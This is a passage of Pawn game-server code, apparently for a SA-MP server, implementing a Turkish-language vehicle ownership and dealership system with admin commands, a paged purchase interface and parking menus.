	Araclar[ArabaID][AracPJ] = 3;
	Araclar[ArabaID][AracNOS] = false;

	// Modifiye Sistemi
	Araclar[ArabaID][AracNeon] = 0;
	Araclar[ArabaID][AracNeonObj][0] = -1;
	Araclar[ArabaID][AracNeonObj][1] = -1;

	// Karavan Sistemi
	Araclar[ArabaID][AracKaravan] = false;
	Araclar[ArabaID][AracKaravanObj] = -1;
	Araclar[ArabaID][AracKaravan3D] = Text3D:-1;
	return ArabaID;
}

// Destroy_Vehicle
forward Destroy_Vehicle(AracID);
public Destroy_Vehicle(AracID)
{
	if(GetVehicleModel(AracID) == 0) return 0;
	DestroyVehicle(AracID);
	Araclar[AracID][AracStatic] = false;

	// Araç Kiralama Sistemi
	if(Araclar[AracID][AracKira] == true)
	{
//	    KiralananArac[ Araclar[AracID][AracKiralayan] ] = -1;
	    Araclar[AracID][AracKiralayan] = -1;
	}

	Araclar[AracID][AracKira] = false;
	Araclar[AracID][AracInSHP] = false; // Araç Sahiplik Sistemi

	// Modifiye Sistemi
	if(Araclar[AracID][AracNeonObj][0] != -1) DestroyObject(Araclar[AracID][AracNeonObj][0]);
	if(Araclar[AracID][AracNeonObj][1] != -1) DestroyObject(Araclar[AracID][AracNeonObj][1]);
	Araclar[AracID][AracNeonObj][0] = -1;
	Araclar[AracID][AracNeonObj][1] = -1;
	Araclar[AracID][AracNeon] = 0;

	// Karavan Sistemi
	if(Araclar[AracID][AracKaravan] == true)
	{
	    Araclar[AracID][AracKaravan] = false;
	    if(Araclar[AracID][AracKaravanObj] != -1) { DestroyDynamicObject(Araclar[AracID][AracKaravanObj]); Araclar[AracID][AracKaravanObj] = -1; }
	    if(Araclar[AracID][AracKaravan3D] != Text3D:-1) { DestroyDynamic3DTextLabel(Araclar[AracID][AracKaravan3D]); Araclar[AracID][AracKaravan3D] = Text3D:-1; }
	}
	return 1;
}

// < Araç Sahiplik Sistemi > ===================================================
// /araba
CMD:araba(playerid, params[])
{
	if(APlayerData[playerid][PlayerJailed] > 0) return Hata(playerid, "Hapisteyken bunu yapamazsýnýz!");
	ShowPlayerAracList(playerid);
	return 1;
}

// /asatinal
CMD:asatinal(playerid, params[])
{
	if(GetPlayerAracCount(playerid) == MAX_OYUNCU_ARAC) return Hata(playerid, "Araç satýn alma sýnýrýný aþmýþsýnýz!");
	if(!IsPlayerInAnyVehicle(playerid)) return Hata(playerid, "Araç Sahiplik Sistemi'nden silmek istediðiniz aracýn içinde olmalýsýnýz!");
	if(Araclar[ GetPlayerVehicleID(playerid) ][AracInSHP] == false) return Hata(playerid, "Bu araç Araç Sahiplik Sistemi'nde deðil!");
	new ASHPID = Araclar[ GetPlayerVehicleID(playerid) ][AracSHPID];

	if(!strcmp("-", AracSHP[ASHPID][ASHPSahip], true))
	{
	    if(APlayerData[playerid][PlayerMoney] < AracSHP[ASHPID][ASHPFiyat]) return Hata(playerid, "Bu aracý satýn alabilecek kadar paranýz yok!");
	    ParaVer(playerid, -AracSHP[ASHPID][ASHPFiyat]);
	    format(AracSHP[ASHPID][ASHPSahip], 50, GetName(playerid));
	    AracSHP[ASHPID][ASHPNeedSave] = true;

	    GivePlayerAchievement(playerid, ArabaSevdasiAch, 1); // Baþarým Sistemi

	    new Yazi[256];
	    format(Yazi, 256, "Bindiðiniz aracý {00CED1}%d${ADFF2F}'a satýn aldýnýz.", AracSHP[ASHPID][ASHPFiyat]);
	    Bilgi(playerid, Yazi);
	    Bilgi(playerid, "Aracýnýzý yönetmek için {00CED1}/araba {ADFF2F}komutunu kullanabilirsiniz.");
	}else Hata(playerid, "Bu aracýn bir sahibi var!");
	return 1;
}

// /arabaekle
CMD:arabaekle(playerid, params[])
{
	if(APlayerData[playerid][PlayerLevel] < 5) return Hata(playerid, "{FFCC00}» {FFFFFF}Bu komutu kullanmak için yetkiniz yok.");
	new tmp[128], idx;
	tmp = strtok(params, idx);
	if(!strlen(tmp)) return SendSyntaxMessage(playerid, "/arabaekle {FFC000}[ Model Ismi/ID'i ][ Renk 1 ][ Renk 2 ][ Fiyat ]"); 

	new Modela;

	if(IsNumeric(tmp))
	{
 		Modela = strval(tmp);
	}else{
 		Modela = GetVehicleModelIDFromName(tmp);
	}

	if(Modela < 400 || Modela > 611) return Hata(playerid, "Hatalý araç modeli!");

	tmp = strtok(params, idx);
	if(!strlen(tmp)) return SendSyntaxMessage(playerid, "/arabaekle {FFC000}[ Model Ismi/ID'i ][ Renk 1 ][ Renk 2 ][ Fiyat ]");
	new Renk1 = strval(tmp);

	tmp = strtok(params, idx);
	if(!strlen(tmp)) return SendSyntaxMessage(playerid, "/arabaekle {FFC000}[ Model Ismi/ID'i ][ Renk 1 ][ Renk 2 ][ Fiyat ]");
	new Renk2 = strval(tmp);

	tmp = strtok(params, idx);
	if(!strlen(tmp)) return SendSyntaxMessage(playerid, "/arabaekle {FFC000}[ Model Ismi/ID'i ][ Renk 1 ][ Renk 2 ][ Fiyat ]");
	new Fiyat = strval(tmp);

	tmp = strtok(params, idx);
	if(!strlen(tmp)) return SendSyntaxMessage(playerid, "/arabaekle {FFC000}[ Model Ismi/ID'i ][ Renk 1 ][ Renk 2 ][ Fiyat ]");

	new Float:oX, Float:oY, Float:oZ, Float:oRot;
	GetPlayerPos(playerid, oX, oY, oZ);
	GetPlayerFacingAngle(playerid, oRot);

	oX = oX + (5.0 * floatcos(oRot+90.0, degrees));
	oY = oY + (5.0 * floatsin(oRot+90.0, degrees));

	new Yazi[300];
	format(Yazi, 300, "{00CED1}Araç Sahiplik Sistemi{F8F8FF}'de {48D1CC}%s {F8F8FF}oluþturdunuz. ({FF4040}%d,%d{F8F8FF})", VehNames[Modela-400], Renk1, Renk2);
	SendClientMessage(playerid, -1, Yazi);

    Arac_Yeni(Modela, tmp, oX, oY, oZ, oRot + 90.0, Renk1, Renk2, Fiyat, tmp);
	return 1;
}

// /arabasil
CMD:arabasil(playerid, params[])
{
	if(APlayerData[playerid][PlayerLevel] < 7) return Hata(playerid, "{FFCC00}» {FFFFFF}Bu komutu kullanmak için yetkiniz yok.");
	if(!IsPlayerInAnyVehicle(playerid)) return Hata(playerid, "Araç Sahiplik Sistemi'nden silmek istediðiniz aracýn içinde olmalýsýnýz!");
	if(Araclar[ GetPlayerVehicleID(playerid) ][AracInSHP] == false) return Hata(playerid, "Bu araç Araç Sahiplik Sistemi'nde deðil!");
	Arac_Sil(Araclar[ GetPlayerVehicleID(playerid) ][AracSHPID]);
	Bilgi(playerid, "Binmiþ olduðunuz araç, Araç Sahiplik Sistemi'nden silindi.");
	return 1;

}

// /galeriekle
CMD:galeriekle(playerid, params[])
{
	if(APlayerData[playerid][PlayerLevel] < 7) return Hata(playerid, "{FFCC00}» {FFFFFF}Bu komutu kullanmak için yetkiniz yok.");

	ShowPlayerDialog(playerid, DialogGaleriEkle, DIALOG_STYLE_LIST, "{FFC000}Galeri Ekle", "{DDDDDD}Otomobil & Ticari Araç Galerisi\n{ADFF2F}» {DDDDDD}Motosiklet & Bisiklet Galerisi\n{ADFF2F}» {DDDDDD}Tekne Galerisi\n{ADFF2F}» {DDDDDD}Hava Aracý Galerisi\n{ADFF2F}» {DDDDDD}Karavan Galerisi", "Ekle", "Ýptal");
	return 1;
}

// /galerisil
CMD:galerisil(playerid, params[])
{
	if(APlayerData[playerid][PlayerLevel] < 7) return Hata(playerid, "{FFCC00}» {FFFFFF}Bu komutu kullanmak için yetkiniz yok.");

	new YakinGaleri = NearGaleri(playerid);

	if(YakinGaleri == -1) return Hata(playerid, "Yakýnlarda galeri yok!");

	Galeri_Sil(YakinGaleri);
	Bilgi(playerid, "Yanýnýzdaki galeri silindi.");
	return 1;
}

// Galeri_ClickTextDraw
Galeri_ClickTextDraw(playerid, Text:clickedid)
{
	if(clickedid == Text:INVALID_TEXT_DRAW && Galeride[playerid] == true)
	{
		GaleriUI_Hide(playerid);
	}
	return 1;
}

// Galeri_ClickPlayerTextDraw
Galeri_ClickPlayerTextDraw(playerid, PlayerText:playertextid)
{
	if(Galeride[playerid] == false) return 1;
	new Yazi[256];

	if(playertextid == UI_AKPrev[playerid])
	{
 		if(GaleriSayfa[playerid] == 1) return 1;
   		GaleriSayfa[playerid]--;
   		GaleriUI_Show(playerid);
	}

	if(playertextid == UI_AKNext[playerid])
	{
    	new SayfaSayisi;

		switch(GaleriTip[playerid])
		{
	    	case Galeri_Otomobil:
	    	{
            	SayfaSayisi = ( ( sizeof(OTAGalerisi) - (sizeof(OTAGalerisi) % 6) ) / 6 ) + 1;
	        }

			case Galeri_Motosiklet:
			{
            	SayfaSayisi = ( ( sizeof(MBGalerisi) - (sizeof(MBGalerisi) % 6) ) / 6 ) + 1;
			}

			case Galeri_Tekne:
			{
            	SayfaSayisi = ( ( sizeof(TGalerisi) - (sizeof(TGalerisi) % 6) ) / 6 ) + 1;
			}

			case Galeri_HavaAraci:
			{
            	SayfaSayisi = ( ( sizeof(HAGalerisi) - (sizeof(HAGalerisi) % 6) ) / 6 ) + 1;
			}
		}

   		if(GaleriSayfa[playerid] == SayfaSayisi) return 1;
     	GaleriSayfa[playerid]++;
      	GaleriUI_Show(playerid);
	}

	for(new i; i < 6; i++)
	{
	    if(playertextid == UI_AKItemModel[playerid][i])
	    {
	        if(GetPlayerAracCount(playerid) == MAX_OYUNCU_ARAC) { Hata(playerid, "Araç satýn alma sýnýrýný aþmýþsýnýz!"); break; }
			switch(GaleriTip[playerid])
			{
	    		case Galeri_Otomobil:
	    		{
	        		if(APlayerData[playerid][PlayerMoney] < OTAGalerisi[ GaleriItemID[playerid][i] ][GAracUcret]) return Hata(playerid, "Bu aracý satýn almak için yeterli paranýz yok!");
	        		if(Level[playerid] < OTAGalerisi[ GaleriItemID[playerid][i] ][GAracLevel]) return Hata(playerid, "Bu aracý satýn almak için yeterli levele sahip deðilsin!");
	        		GaleriSItem[playerid] = GaleriItemID[playerid][i];

					format(Yazi, 256, "{00CED1}%s {DDDDDD}model aracý {00CED1}%d${DDDDDD}'a satýn almak istiyor musunuz?", VehNames[ OTAGalerisi[ GaleriItemID[playerid][i] ][GAracModel] - 400 ], OTAGalerisi[ GaleriItemID[playerid][i] ][GAracUcret]);
					ShowPlayerDialog(playerid, DialogGaleriSatinAl, DIALOG_STYLE_MSGBOX, "{FFC000}Araç Satýn Al", Yazi, "Evet", "Hayýr");
	       	 	}

				case Galeri_Motosiklet:
				{
	        		if(APlayerData[playerid][PlayerMoney] < MBGalerisi[ GaleriItemID[playerid][i] ][GAracUcret]) return Hata(playerid, "Bu aracý satýn almak için yeterli paranýz yok!");
                    if(Level[playerid] < MBGalerisi[ GaleriItemID[playerid][i] ][GAracLevel]) return Hata(playerid, "Bu aracý satýn almak için yeterli levele sahip deðilsin!");
	        		GaleriSItem[playerid] = GaleriItemID[playerid][i];

					format(Yazi, 256, "{00CED1}%s {DDDDDD}model aracý {00CED1}%d${DDDDDD}'a satýn almak istiyor musunuz?", VehNames[ MBGalerisi[ GaleriItemID[playerid][i] ][GAracModel] - 400 ], MBGalerisi[ GaleriItemID[playerid][i] ][GAracUcret]);
					ShowPlayerDialog(playerid, DialogGaleriSatinAl, DIALOG_STYLE_MSGBOX, "{FFC000}Araç Satýn Al", Yazi, "Evet", "Hayýr");
				}

				case Galeri_Tekne:
				{
	        		if(APlayerData[playerid][PlayerMoney] < TGalerisi[ GaleriItemID[playerid][i] ][GAracUcret]) return Hata(playerid, "Bu aracý satýn almak için yeterli paranýz yok!");
	        		if(Level[playerid] < TGalerisi[ GaleriItemID[playerid][i] ][GAracLevel]) return Hata(playerid, "Bu aracý satýn almak için yeterli levele sahip deðilsin!");
	        		GaleriSItem[playerid] = GaleriItemID[playerid][i];

					format(Yazi, 256, "{00CED1}%s {DDDDDD}model aracý {00CED1}%d${DDDDDD}'a satýn almak istiyor musunuz?", VehNames[ TGalerisi[ GaleriItemID[playerid][i] ][GAracModel] - 400 ], TGalerisi[ GaleriItemID[playerid][i] ][GAracUcret]);
					ShowPlayerDialog(playerid, DialogGaleriSatinAl, DIALOG_STYLE_MSGBOX, "{FFC000}Araç Satýn Al", Yazi, "Evet", "Hayýr");
				}

				case Galeri_HavaAraci:
				{
	        		if(APlayerData[playerid][PlayerMoney] < HAGalerisi[ GaleriItemID[playerid][i] ][GAracUcret]) return Hata(playerid, "Bu aracý satýn almak için yeterli paranýz yok!");
	        		if(Level[playerid] < HAGalerisi[ GaleriItemID[playerid][i] ][GAracLevel]) return Hata(playerid, "Bu aracý satýn almak için yeterli levele sahip deðilsin!");
	        		GaleriSItem[playerid] = GaleriItemID[playerid][i];

					format(Yazi, 256, "{00CED1}%s {DDDDDD}model aracý {00CED1}%d${DDDDDD}'a satýn almak istiyor musunuz?", VehNames[ HAGalerisi[ GaleriItemID[playerid][i] ][GAracModel] - 400 ], HAGalerisi[ GaleriItemID[playerid][i] ][GAracUcret]);
					ShowPlayerDialog(playerid, DialogGaleriSatinAl, DIALOG_STYLE_MSGBOX, "{FFC000}Araç Satýn Al", Yazi, "Evet", "Hayýr");
				}
			}
	        break;
	    }
	}

	return 1;
}

// GaleriUI_Free
GaleriUI_Free(playerid)
{
	for(new i; i < 6; i++)
	{
		GaleriItemID[playerid][i] = -1;
		PlayerTextDrawHide(playerid, UI_AKItemBG[playerid][i]);
		PlayerTextDrawHide(playerid, UI_AKItemModel[playerid][i]);
		PlayerTextDrawHide(playerid, UI_AKItemInfo[playerid][i]);
	}
}

// GaleriUI_Hide
GaleriUI_Hide(playerid)
{
	Galeride[playerid] = false;

	PlayerTextDrawHide(playerid, UI_AKBG[playerid]);

	GaleriUI_Free(playerid);

	PlayerTextDrawHide(playerid, UI_AKPrev[playerid]);
	PlayerTextDrawHide(playerid, UI_AKNext[playerid]);
	PlayerTextDrawHide(playerid, UI_AKSayfa[playerid]);
	return 1;
}

// GaleriUI_Show
GaleriUI_Show(playerid)
{
    new SayfaSayisi;

	switch(GaleriTip[playerid])
	{
	    case Galeri_Otomobil:
	    {
            SayfaSayisi = ( ( sizeof(OTAGalerisi) - (sizeof(OTAGalerisi) % 6) ) / 6 ) + 1;
	    }

		case Galeri_Motosiklet:
		{
            SayfaSayisi = ( ( sizeof(MBGalerisi) - (sizeof(MBGalerisi) % 6) ) / 6 ) + 1;
		}

		case Galeri_Tekne:
		{
            SayfaSayisi = ( ( sizeof(TGalerisi) - (sizeof(TGalerisi) % 6) ) / 6 ) + 1;
		}

		case Galeri_HavaAraci:
		{
            SayfaSayisi = ( ( sizeof(HAGalerisi) - (sizeof(HAGalerisi) % 6) ) / 6 ) + 1;
		}
	}

	GaleriUI_Free(playerid);

	PlayerTextDrawShow(playerid, UI_AKBG[playerid]);

	new GaleriItemIndex, UI_Yazi[128];

	switch(GaleriTip[playerid])
	{
	    case Galeri_Otomobil:
	    {
			for(new i; i < sizeof(OTAGalerisi); i++)
			{
	    		if(i >= (GaleriSayfa[playerid]-1) * 6)
	    		{
	        		GaleriItemID[playerid][GaleriItemIndex] = i;

	        		PlayerTextDrawSetPreviewModel(playerid, UI_AKItemModel[playerid][GaleriItemIndex], OTAGalerisi[i][GAracModel]);

	        		format(UI_Yazi, 128, "%s~n~~y~Level %d~n~~g~~h~~h~~h~%d$", OTAGalerisi[i][GAracName], OTAGalerisi[i][GAracLevel], OTAGalerisi[i][GAracUcret]);
	        		PlayerTextDrawSetString(playerid, UI_AKItemInfo[playerid][GaleriItemIndex], UI_Yazi);

					PlayerTextDrawShow(playerid, UI_AKItemBG[playerid][GaleriItemIndex]);
					PlayerTextDrawShow(playerid, UI_AKItemModel[playerid][GaleriItemIndex]);
					PlayerTextDrawShow(playerid, UI_AKItemInfo[playerid][GaleriItemIndex]);

	        		GaleriItemIndex++;
	        		if(GaleriItemIndex == 6) break;
	    		}
			}
	    }

		case Galeri_Motosiklet:
		{
			for(new i; i < sizeof(MBGalerisi); i++)
			{
	    		if(i >= (GaleriSayfa[playerid]-1) * 6)
	    		{
	        		GaleriItemID[playerid][GaleriItemIndex] = i;

	        		PlayerTextDrawSetPreviewModel(playerid, UI_AKItemModel[playerid][GaleriItemIndex], MBGalerisi[i][GAracModel]);

	        		format(UI_Yazi, 128, "%s~n~~y~Level %d~n~~g~~h~~h~~h~%d$", MBGalerisi[i][GAracName], MBGalerisi[i][GAracLevel], MBGalerisi[i][GAracUcret]);
	        		PlayerTextDrawSetString(playerid, UI_AKItemInfo[playerid][GaleriItemIndex], UI_Yazi);

					PlayerTextDrawShow(playerid, UI_AKItemBG[playerid][GaleriItemIndex]);
					PlayerTextDrawShow(playerid, UI_AKItemModel[playerid][GaleriItemIndex]);
					PlayerTextDrawShow(playerid, UI_AKItemInfo[playerid][GaleriItemIndex]);

	        		GaleriItemIndex++;
	        		if(GaleriItemIndex == 6) break;
	    		}
			}
		}

		case Galeri_Tekne:
		{
			for(new i; i < sizeof(TGalerisi); i++)
			{
	    		if(i >= (GaleriSayfa[playerid]-1) * 6)
	    		{
	        		GaleriItemID[playerid][GaleriItemIndex] = i;

	        		PlayerTextDrawSetPreviewModel(playerid, UI_AKItemModel[playerid][GaleriItemIndex], TGalerisi[i][GAracModel]);

	        		format(UI_Yazi, 128, "%s~n~~y~Level %d~n~~g~~h~~h~~h~%d$", TGalerisi[i][GAracName], TGalerisi[i][GAracLevel], TGalerisi[i][GAracUcret]);
	        		PlayerTextDrawSetString(playerid, UI_AKItemInfo[playerid][GaleriItemIndex], UI_Yazi);

					PlayerTextDrawShow(playerid, UI_AKItemBG[playerid][GaleriItemIndex]);
					PlayerTextDrawShow(playerid, UI_AKItemModel[playerid][GaleriItemIndex]);
					PlayerTextDrawShow(playerid, UI_AKItemInfo[playerid][GaleriItemIndex]);

	        		GaleriItemIndex++;
	        		if(GaleriItemIndex == 6) break;
	    		}
			}
		}

		case Galeri_HavaAraci:
		{
			for(new i; i < sizeof(HAGalerisi); i++)
			{
	    		if(i >= (GaleriSayfa[playerid]-1) * 6)
	    		{
	        		GaleriItemID[playerid][GaleriItemIndex] = i;

	        		PlayerTextDrawSetPreviewModel(playerid, UI_AKItemModel[playerid][GaleriItemIndex], HAGalerisi[i][GAracModel]);

	        		format(UI_Yazi, 128, "%s~n~~y~Level %d~n~~g~~h~~h~~h~%d$", HAGalerisi[i][GAracName], HAGalerisi[i][GAracLevel], HAGalerisi[i][GAracUcret]);
	        		PlayerTextDrawSetString(playerid, UI_AKItemInfo[playerid][GaleriItemIndex], UI_Yazi);

					PlayerTextDrawShow(playerid, UI_AKItemBG[playerid][GaleriItemIndex]);
					PlayerTextDrawShow(playerid, UI_AKItemModel[playerid][GaleriItemIndex]);
					PlayerTextDrawShow(playerid, UI_AKItemInfo[playerid][GaleriItemIndex]);

	        		GaleriItemIndex++;
	        		if(GaleriItemIndex == 6) break;
	    		}
			}
		}
	}

	PlayerTextDrawShow(playerid, UI_AKPrev[playerid]);
	PlayerTextDrawShow(playerid, UI_AKNext[playerid]);

	format(UI_Yazi, 128, "%d/%d", GaleriSayfa[playerid], SayfaSayisi);
	PlayerTextDrawSetString(playerid, UI_AKSayfa[playerid], UI_Yazi);
	PlayerTextDrawShow(playerid, UI_AKSayfa[playerid]);
	return 1;
}

// AracDialogs
AracDialogs(playerid, dialogid, response, listitem, inputtext[])
{
	new Yazi[128];

	switch(dialogid)
	{
	    case DialogGaleriEkle:
	    {
	        if(response)
	        {
	            new Float:oX, Float:oY, Float:oZ;
	            GetPlayerPos(playerid, oX, oY, oZ);
				Galeri_Yeni(listitem, oX, oY, oZ);

				Bilgi(playerid, "Bulunduðunuz yere galeri eklediniz.");
	        }
	    }

	    case DialogGaleriSatinAl:
	    {
	        if(response)
	        {
				switch(GaleriTip[playerid])
				{
	    			case Galeri_Otomobil:
	    			{
 	        			new AracID = Arac_Yeni(OTAGalerisi[ GaleriSItem[playerid] ][GAracModel], GetName(playerid), 30.000, 30.000, 30.000, 0.0, random(300), random(300), OTAGalerisi[ GaleriSItem[playerid] ][GAracUcret], GetName(playerid));

						if(AracID == -1) return Hata(playerid, "Þuanda size araç veremiyoruz! Lütfen sonra tekrar geliniz.");

						ParaVer(playerid, -OTAGalerisi[ GaleriSItem[playerid] ][GAracUcret]);

	        			format(Yazi, 128, "{00CED1}%d${ADFF2F}'a {00CED1}%s {ADFF2F}satýn aldýnýz.", OTAGalerisi[ GaleriSItem[playerid] ][GAracUcret], VehNames[ OTAGalerisi[ GaleriSItem[playerid] ][GAracModel] - 400 ]);
						Bilgi(playerid, Yazi);
						Bilgi(playerid, "Aracýnýzý yanýnýza getirmek için {00CED1}/araba {ADFF2F}yazýnýz.");

						new LogYazi[300];
						format(LogYazi, 300, "[ARAC] %s(%d), %d ID'li %s model araci %d$'a satin aldi.", GetName(playerid), playerid, AracID, OTAGalerisi[ GaleriSItem[playerid] ][GAracUcret], OTAGalerisi[ GaleriSItem[playerid] ][GAracUcret]);
						LOG(LogYazi);

                        GivePlayerAchievement(playerid, ArabaSevdasiAch, 1); // Baþarým Sistemi

		    			CancelSelectTextDraw(playerid);
	        			GaleriUI_Hide(playerid);
	       	 		}

					case Galeri_Motosiklet:
					{
	        			new AracID = Arac_Yeni(MBGalerisi[ GaleriSItem[playerid] ][GAracModel], GetName(playerid), 30.000, 30.000, 30.000, 0.0, random(300), random(300), MBGalerisi[ GaleriSItem[playerid] ][GAracUcret], GetName(playerid));

						if(AracID == -1) return Hata(playerid, "Þuanda size araç veremiyoruz! Lütfen sonra tekrar geliniz.");

	        			ParaVer(playerid, -MBGalerisi[ GaleriSItem[playerid] ][GAracUcret]);

	        			format(Yazi, 128, "{00CED1}%d${ADFF2F}'a {00CED1}%s {ADFF2F}satýn aldýnýz.", MBGalerisi[ GaleriSItem[playerid] ][GAracUcret], VehNames[ MBGalerisi[ GaleriSItem[playerid] ][GAracModel] - 400 ]);
						Bilgi(playerid, Yazi);
						Bilgi(playerid, "Aracýnýzý yanýnýza getirmek için {00CED1}/araba {ADFF2F}yazýnýz.");

						new LogYazi[300];
						format(LogYazi, 300, "[ARAC] %s(%d), %d ID'li %s model araci %d$'a satin aldi.", GetName(playerid), playerid, AracID, MBGalerisi[ GaleriSItem[playerid] ][GAracUcret], MBGalerisi[ GaleriSItem[playerid] ][GAracUcret]);
						LOG(LogYazi);

                        GivePlayerAchievement(playerid, ArabaSevdasiAch, 1); // Baþarým Sistemi

		    			CancelSelectTextDraw(playerid);
	        			GaleriUI_Hide(playerid);
					}

					case Galeri_Tekne:
					{
						new AracID = Arac_Yeni(TGalerisi[ GaleriSItem[playerid] ][GAracModel], GetName(playerid), 30.000, 30.000, 30.000, 0.0, random(300), random(300), TGalerisi[ GaleriSItem[playerid] ][GAracUcret], GetName(playerid));

						if(AracID == -1) return Hata(playerid, "Þuanda size araç veremiyoruz! Lütfen sonra tekrar geliniz.");

	        			ParaVer(playerid, -TGalerisi[ GaleriSItem[playerid] ][GAracUcret]);

	        			format(Yazi, 128, "{00CED1}%d${ADFF2F}'a {00CED1}%s {ADFF2F}satýn aldýnýz.", TGalerisi[ GaleriSItem[playerid] ][GAracUcret], VehNames[ TGalerisi[ GaleriSItem[playerid] ][GAracModel] - 400 ]);
						Bilgi(playerid, Yazi);
						Bilgi(playerid, "Aracýnýzý yanýnýza getirmek için {00CED1}/araba {ADFF2F}yazýnýz.");

						new LogYazi[300];
						format(LogYazi, 300, "[ARAC] %s(%d), %d ID'li %s model araci %d$'a satin aldi.", GetName(playerid), playerid, AracID, TGalerisi[ GaleriSItem[playerid] ][GAracUcret], TGalerisi[ GaleriSItem[playerid] ][GAracUcret]);
						LOG(LogYazi);

                        GivePlayerAchievement(playerid, ArabaSevdasiAch, 1); // Baþarým Sistemi

		    			CancelSelectTextDraw(playerid);
	        			GaleriUI_Hide(playerid);
					}

					case Galeri_HavaAraci:
					{
	        			new AracID = Arac_Yeni(HAGalerisi[ GaleriSItem[playerid] ][GAracModel], GetName(playerid), 30.000, 30.000, 30.000, 0.0, random(300), random(300), HAGalerisi[ GaleriSItem[playerid] ][GAracUcret], GetName(playerid));

						if(AracID == -1) return Hata(playerid, "Þuanda size araç veremiyoruz! Lütfen sonra tekrar geliniz.");

						ParaVer(playerid, -HAGalerisi[ GaleriSItem[playerid] ][GAracUcret]);

	        			format(Yazi, 128, "{00CED1}%d${ADFF2F}'a {00CED1}%s {ADFF2F}satýn aldýnýz.", HAGalerisi[ GaleriSItem[playerid] ][GAracUcret], VehNames[ HAGalerisi[ GaleriSItem[playerid] ][GAracModel] - 400 ]);
						Bilgi(playerid, Yazi);
						Bilgi(playerid, "Aracýnýzý yanýnýza getirmek için {00CED1}/araba {ADFF2F}yazýnýz.");

						new LogYazi[300];
						format(LogYazi, 300, "[ARAC] %s(%d), %d ID'li %s model araci %d$'a satin aldi.", GetName(playerid), playerid, AracID, HAGalerisi[ GaleriSItem[playerid] ][GAracUcret], HAGalerisi[ GaleriSItem[playerid] ][GAracUcret]);
						LOG(LogYazi);

                        GivePlayerAchievement(playerid, ArabaSevdasiAch, 1); // Baþarým Sistemi

		    			CancelSelectTextDraw(playerid);
	        			GaleriUI_Hide(playerid);
					}
				}
	        }
	    }

	    case DialogOyuncuAracList:
	    {
	        if(response)
	        {
	            AYSItemID[playerid] = AYItemID[playerid][listitem];
	            ShowPlayerAracMenu(playerid);
	        }
	    }

	    case DialogOyuncuAracMenu:
	    {
	        if(response)
	        {
				switch(listitem)
				{
				    case 0: // Fiyat
				    {
                        ShowPlayerAracMenu(playerid);
				    }

				    case 1: // Plaka
				    {
					    if(GetPlayerVehicleID(playerid) != AracSHP[ AYSItemID[playerid] ][ASHPVehID]) return Hata(playerid, "Aracýn plakasýný deðiþtirebilmek için içinde olmanýz gerekiyor!"), ShowPlayerAracMenu(playerid);
				        new DiaYazi[256];
				        format(DiaYazi, 256, "{DDDDDD}Aracýnýzýn Mevcut Plakasý:\n{00CED1}%s\n \n{DDDDDD}Aracýnýzýn plakasýný ne yapmak istiyorsunuz?", AracSHP[ AYSItemID[playerid] ][ASHPPlaka]);
				        ShowPlayerDialog(playerid, DialogOyuncuAracPlaka, DIALOG_STYLE_INPUT, "{FFC000}Araç Plakasý", DiaYazi, "Deðiþtir", "Ýptal");
				    }

				    case 2: // Araç Eriþimi
				    {
						switch(AracSHP[ AYSItemID[playerid] ][ASHPIzin])
						{
	    					case 0:	{ AracSHP[ AYSItemID[playerid] ][ASHPIzin] = 1; Bilgi(playerid, "Aracýnýza artýk sadece siz binebilirsiniz."); }
	    					case 1:	{ AracSHP[ AYSItemID[playerid] ][ASHPIzin] = 0; Bilgi(playerid, "Aracýnýza artýk herkes binebilir."); }
						}

                        AracSHP[ AYSItemID[playerid] ][ASHPNeedSave] = true;

				        ShowPlayerAracMenu(playerid);
				    }

				    case 4: // Aracý Yanýna Çek
					{
						new Float:oX, Float:oY, Float:oZ, Float:oRot;
						GetPlayerPos(playerid, oX, oY, oZ);
						GetPlayerFacingAngle(playerid, oRot);

						oX = oX + (5.0 * floatcos(oRot+90.0, degrees));
						oY = oY + (5.0 * floatsin(oRot+90.0, degrees));
						SetVehiclePos(AracSHP[ AYSItemID[playerid] ][ASHPVehID], oX, oY, oZ);
						SetVehicleZAngle(AracSHP[ AYSItemID[playerid] ][ASHPVehID], oRot + 90.0);

						Bilgi(playerid, "Aracýnýzý yanýnýza çektiniz.");
					}

					case 5: // Aracý Park Et
					{
					    if(GetPlayerVehicleID(playerid) != AracSHP[ AYSItemID[playerid] ][ASHPVehID] && AracSHP[ AYSItemID[playerid] ][ASHPKaravan] == 0) return Hata(playerid, "Aracý park edebilmek için içinde olmanýz gerekiyor!"), ShowPlayerAracMenu(playerid);
						new panels, doors, lights, tires;
						GetVehicleDamageStatus(AracSHP[ AYSItemID[playerid] ][ASHPVehID], panels, doors, lights, tires);
						GetVehiclePos(AracSHP[ AYSItemID[playerid] ][ASHPVehID], AracSHP[ AYSItemID[playerid] ][ASHPX], AracSHP[ AYSItemID[playerid] ][ASHPY], AracSHP[ AYSItemID[playerid] ][ASHPZ]);
						GetVehicleZAngle(AracSHP[ AYSItemID[playerid] ][ASHPVehID], AracSHP[ AYSItemID[playerid] ][ASHPRot]);
                        Arac_FetchMod(AYSItemID[playerid]);
						Destroy_Vehicle(AracSHP[ AYSItemID[playerid] ][ASHPVehID]);
						Araclar[ AracSHP[ AYSItemID[playerid] ][ASHPVehID] ][AracInSHP] = false;

						AracSHP[ AYSItemID[playerid] ][ASHPVehID] = Add_DynamicVehicle(AracSHP[ AYSItemID[playerid] ][ASHPModel], AracSHP[ AYSItemID[playerid] ][ASHPX], AracSHP[ AYSItemID[playerid] ][ASHPY], AracSHP[ AYSItemID[playerid] ][ASHPZ], AracSHP[ AYSItemID[playerid] ][ASHPRot], AracSHP[ AYSItemID[playerid] ][ASHPRenk1], AracSHP[ AYSItemID[playerid] ][ASHPRenk2], -1);
						Araclar[ AracSHP[ AYSItemID[playerid] ][ASHPVehID] ][AracInSHP] = true;
						Araclar[ AracSHP[ AYSItemID[playerid] ][ASHPVehID] ][AracSHPID] = AYSItemID[playerid];
						SetVehicleNumberPlate(AracSHP[ AYSItemID[playerid] ][ASHPVehID], AracSHP[ AYSItemID[playerid] ][ASHPPlaka]);
						SetVehicleToRespawn(AracSHP[ AYSItemID[playerid] ][ASHPVehID]);
						if(AracSHP[ AYSItemID[playerid] ][ASHPKaravan] == 0) PutPlayerInVehicle(playerid, AracSHP[ AYSItemID[playerid] ][ASHPVehID], 0);
						UpdateVehicleDamageStatus(AracSHP[ AYSItemID[playerid] ][ASHPVehID], panels, doors, lights, tires);

						Arac_LoadMod(AYSItemID[playerid]);

						if(AracSHP[ AYSItemID[playerid] ][ASHPKaravan] == 1)
						{
							Araclar[ AracSHP[ AYSItemID[playerid] ][ASHPVehID] ][AracKaravan] = true;
